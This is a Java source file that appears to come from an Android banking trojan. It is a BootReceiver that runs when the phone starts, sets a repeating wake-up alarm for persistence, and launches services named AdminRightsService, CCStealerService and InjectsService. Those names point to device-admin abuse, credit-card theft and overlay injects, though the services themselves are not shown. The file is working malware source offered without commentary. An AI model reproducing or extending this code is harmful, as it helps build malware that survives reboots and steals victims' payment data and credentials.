package com.moonny.rcvs;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.moonny.acts.MainActivity;
import com.moonny.constants.Constant;
import com.moonny.helpers.Utils;
import com.moonny.srvs.AdminRightsService;
import com.moonny.srvs.CCStealerService;
import com.moonny.srvs.InjectsService;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context ctx, Intent intent2) {

        if(Utils.is_blocked(ctx)) {
            return;
        }

        startAlManager(ctx);

        Intent ad = new Intent(ctx,AdminRightsService.class);
        ctx.startService(ad);

        Intent fd = new Intent(ctx, CCStealerService.class);
        ctx.startService(fd);

        Intent gp = new Intent(ctx,InjectsService.class);
        ctx.startService(gp);
    }

    private void startAlManager(Context ctx) {
        AlarmManager alManager = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        long slp = Constant.MAIN_SLEEP;

        alManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), slp,
                PendingIntent.getBroadcast(ctx.getApplicationContext(), 0, new Intent(MainActivity.ALARM_ACTION), 0));
    }
}